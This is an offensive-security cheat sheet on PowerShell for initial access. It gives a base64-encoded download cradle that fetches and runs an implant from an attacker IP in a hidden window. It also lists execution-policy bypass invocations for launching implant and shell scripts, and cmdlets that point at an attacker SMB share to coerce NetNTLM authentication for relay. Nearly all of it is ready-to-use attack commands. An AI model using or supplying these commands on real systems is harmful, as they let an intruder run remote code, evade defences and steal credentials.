---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - living-off-the-land
  - windows
---
# PowerShell

## 01 - Base64 Encoded

Encode the string of commands.

```
$ string="IEX ((New-Object Net.WebClient).DownloadString('http[s]://<IP>/implant.ps1'))"

$ iconv -t UTF-16LE <<< $string | base64 -w 0

$ iconv -t UTF-16LE <<< $string | basenc -w 0 --base64

$ iconv -t UTF-16LE <<< $string | openssl enc -a -e -A

$ iconv -t UTF-16LE <<< $string | openssl enc -base64 -A
```

Then execute it in a one-liner.

```
C:\> powershell.exe -nop -NonI -Nologo -w hidden -enc <base64_encoded>
```

## 02 - Execute Implant

System32 is for 32-bit powershell payloads

```
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -w hidden -nologo -noni -nop -ex bypass -f file.ps1

C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -w hidden -nologo -noni -nop -ep bypass -f file.ps1
```

SysWOW64 is for 64-bit powershell payloads

```
C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe -nop -ep bypass -f shell.ps1

C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe -w hidden -nologo -noni -nop -ep bypass -f shell.ps1
```

### 2.1 - Execution Policy

```
PS C:\> Set-ExecutionPolicy Bypass -Scope <CurrentUser | Process> [-File C:\path\to\file.ps1

PS C:\> $Env:PSExecutionPolicyPreference="bypass"
```

Execute cmdlets to perform SMB authentication relay.

```
PS C:\> Get-ChildItem \\<attacker_IP>\<share_name>

PS C:\> Get-Content \\<attacker_IP>\<share_name>\file.txt

PS C:\> Start-Process \\<attacker_IP>\<share_name>

PS C:\> Resolve-DnsName -LlmnrOnly Snare 2> $Null
```

---
## References

### Backlinks

- [[03 - Malware Development/Global Helpers/Evasion/Obfuscation Techniques/Cross Platform/PowerShell||Malware Development: PowerShell Obfuscation Techniques]]

- [[Batch|Malware Development: Batch Obfuscation Techniques]]

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/File Attachment/Implant/Desktop/Windows/Payloads/One-Liners/Reverse Shells/PowerShell|Callback Shells: Powershell]]

### Source Repositories

- [r00t-3xp10it: CmdLine Scripts for Reverse TCP Shell Addicts](https://github.com/r00t-3xp10it/venom/wiki/CmdLine-%26-Scripts-for-reverse-TCP-shell-addicts)

### NetSPI

- [NetSPI: 15 Ways to Bypass the PowerShell Execution Policy](https://www.netspi.com/blog/technical-blog/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/)

### Osanda

- [Osanda: Places of Interest in Stealing NetNTLM Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)